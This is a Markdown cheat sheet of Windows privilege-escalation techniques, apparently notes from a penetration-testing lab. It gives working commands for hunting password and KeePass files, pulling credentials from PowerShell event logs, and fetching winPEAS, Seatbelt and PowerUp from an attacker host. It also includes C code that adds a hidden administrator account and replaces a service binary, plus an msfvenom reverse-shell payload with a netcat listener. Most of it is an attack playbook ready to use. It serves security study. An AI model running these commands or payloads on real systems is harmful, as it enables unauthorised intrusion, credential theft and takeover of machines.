# Windows Enumeration

```bash
# Typical Items to be Enumerated:

# Username and hostname
whoami /priv

# Group memberships of the current user

whoami /groups

# Existing users and groups

powershell
Get-LocalUser
Get-LocalGroup

# If not using powershell, use net localgroup
# With group names, you can enumerate members of those groups:

Get-LocalGroupMember <GROUP NAME>
Get-LocalGroupMember adminteam

# Operating system, version and architecture

systeminfo

# Network information

ipconfig /all
route print
netstat -ano

# Installed applications

#32 bit apps
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

#64 bit apps
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

#Running processes

Get-Process
```
# Finding Files
```bash
# Always search for password files, and even database files. These can be narrowed down based on the installed applications query mentioned above. For example, if KeyPass was present, you would search for a .kdbx file.

#KeyPass Database File
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

#XAMPP Config File
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue

#Password file in Users Directory
Get-ChildItem -Path C:\Users -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue

type C:\xampp\mysql\bin\my.ini

# Search for files on current users (dave) home director
Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

# Using Runas (Need username/password and GUI)
```bash
runas /user:USERNAME cmd

#Example
runas /user:backupadmin cmd
#Insert Password
```

# Information Gathering with Powershell

```bash
# PowerShell history
Get-History

# History from PSReadline
(Get-PSReadlineOption).HistorySavePath
```

## PSRemoting with Alternate Credentials (Must have username/password) (Same thing as WinRM)

```bash
#Agnostic Commands
$password = ConvertTo-SecureString "PASSWORD" -AsPlainText -Force

$cred = New-Object System.Management.Automation.PSCredential("USERNAME", $password)

Enter-PSSession -ComputerName TARGET_HOSTNAME_OR_IP -Credential $cred

whoami

#Example commands
$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force

$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)

Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred

whoami

# Or Log in via EvilWinRM
evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"

```

# Event View Logs for potential passwords

```bash
# Log in via RDP
# Navigate here:
Applications and Services Logs > Microsoft > Windows > PowerShell > Operational

# In the Event ID box type 4104 — that's the Script Block Logging event ID

# Powershell Command Examples of doing the same thing above:
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | Where-Object {$_.Id -eq 4104} | Select-Object -ExpandProperty Message

#Password Events
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | Where-Object {$_.Id -eq 4104 -and $_.Message -like "*SecureString*"} | Select-Object -ExpandProperty Message

# Credential Object
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | Where-Object {$_.Id -eq 4104 -and $_.Message -like "*PSCredential*"} | Select-Object -ExpandProperty Message
```
![alt text](image.png)

# Automated Enumeration via WinPEAS

```bash
#Agnostic Command
iwr -uri http://YOUR IP/winPEASx64.exe -Outfile winPEAS.exe

#Example
iwr -uri http://192.168.45.227/winPEASx64.exe -Outfile winPEAS.ex e

# Run it
.\winPEAS.exe

# Look at `Users` section
# Looking for possible password files in users homes 
```
![alt text](image-1.png)
![alt text](image-2.png)

# Automated Enumeration via Seatbelt.exe

```bash

iwr -uri http://YOUR IP/Seatbelt.exe -Outfile Seatbelt.exe

iwr -uri http://192.168.45.227/Seatbelt.exe -Outfile Seatbelt.exe

# Run it
# This provides all the commands you can run
.\Seatbelt.exe

#Example
.\Seatbelt.exe -group=all
```
# Leveraging Windows Services
```bash
- Hijack service binaries
- Hijack service DLLs
- Abuse Unquoted service paths
```
## Service Binary Hijacking

```bash
#NOTE: When using a network logon such as WinRM or a bind shell, Get-CimInstance and Get-Service will result in a "permission denied" error when querying for services with a non-administrative user. Using an interactive logon such as RDP solves this problem.

# RDP Login example:
xfreerdp3 /v:192.168.109.220 /u:dave /p:lab /cert:ignore +clipboard +fonts +compression /dynamic-resolution /drive:tools,/home/kali/tools

#Load Powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}


```
![alt text](image-3.png)

```bash
# Permission Enumeration
# Look for something out of the ordinary

# enumerate the permissions

Mask	Permissions
F	    Full access
M	    Modify access
RX	    Read and execute access
R	    Read-only access
W	    Write-only access

#Permission Enumeration

icacls "C:\xampp\apache\bin\httpd.exe"

# REFER TO SCREENSHOT: Our user `Dave` has on Read and Execute (RX) privs, we cannot replace the file with a malicious binary. Move on to next file if applicable.

```
![alt text](image-4.png)

```bash
icacls "C:\xampp\mysql\bin\mysqld.exe"


C:\xampp\mysql\bin\mysqld.exe BUILTIN\Administrators:(F)
                              NT AUTHORITY\SYSTEM:(F)
                              BUILTIN\Users:(F)

Successfully processed 1 files; Failed processing 0 files
PS C:\Users\dave>

#  Full Access (F) permission, allowing us to write to and modify the binary and therefore, replace it.
```
![alt text](image-5.png)

## Create a Binary to create a users, and add him to `Administrators` group

```bash

#On Kali - Call it adduser.c

#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```
![alt text](image-6.png)

## cross-compile the code

```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe

#NOTE: Now we can transfer it to our target and replace the original mysqld.exe binary with our malicious copy

# start a Python3 web server in the output directory of 
adduser.exe

# Python Server on Kali Machine
python3 -m http.server 80

# Transfer File
iwr -uri http://KALI IP/adduser.exe -Outfile adduser.exe

#Example Command
iwr -uri http://192.168.48.3/adduser.exe -Outfile adduser.exe

#Move the file that we are replacing out of its location to your current working directory (Back up the legitimate executable)
move C:\xampp\mysql\bin\mysqld.exe mysqld.exe

# Move the new malicious file to the correct location (Renames your malicious adduser.exe to mysqld.exe and drops it in place of the real one)
#Example:
move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe

#NOTE: To execute the binary through the service, we need to restart it

# Stop the service
net stop mysql

# Restart if possible
net start mysql

#NOTE: If you get `ACCESS DENIED`, consider retarting the machine. 1st: Check if service AUTO starts on restart. 2nd: Check if current user has privs.

#1st step:
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}

#Results
Name  StartMode
----  ---------
mysql Auto

#2nd Step:
whoami /priv
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeSecurityPrivilege           Manage auditing and security log     Disabled
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled

#Issue Reboot Command
shutdown /r /t 0

#See if Attack Worked
Get-LocalGroupMember administrators

#Results
ObjectClass Name                      PrincipalSource
----------- ----                      ---------------
User        CLIENTWK220\Administrator Local
User        CLIENTWK220\BackupAdmin   Local
User        CLIENTWK220\dave2         Local
User        CLIENTWK220\daveadmin     Local
User        CLIENTWK220\offsec        Local

# Log in as user via RDP, WinRM or whatever service is available.
#RunAs Example
runas /user:dave2 cmd.exe

```
## Create Reverse Shell instead of new user
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_KALI_IP LPORT=4444 -f exe -o mysqld.exe

# Or use revshells `Powershell #3 (base64)
# Compile this script
#include <stdlib.h>
int main() {
  system("powershell -e BASE64PAYLOADHERE");
  return 0;
}
# Compile it:
x86_64-w64-mingw32-gcc adduser.c -o mysqld.exe

# Replace the file with the steps above, and restart service or system.

# Start Listener

nc -nvlp 4444
```
## Automate finding a potential file for Service Binary Hijacking

```bash

#Host Python server with file
python3 -m http.server 80

# Transfer File
iwr -uri http://192.168.45.227/PowerUp.ps1 -Outfile PowerUp.ps1

# Run powershell with -ep bypass
powershell -ep bypass

# Run file
. .\PowerUp.ps1

# See potentially modifiable files
Get-ModifiableServiceFile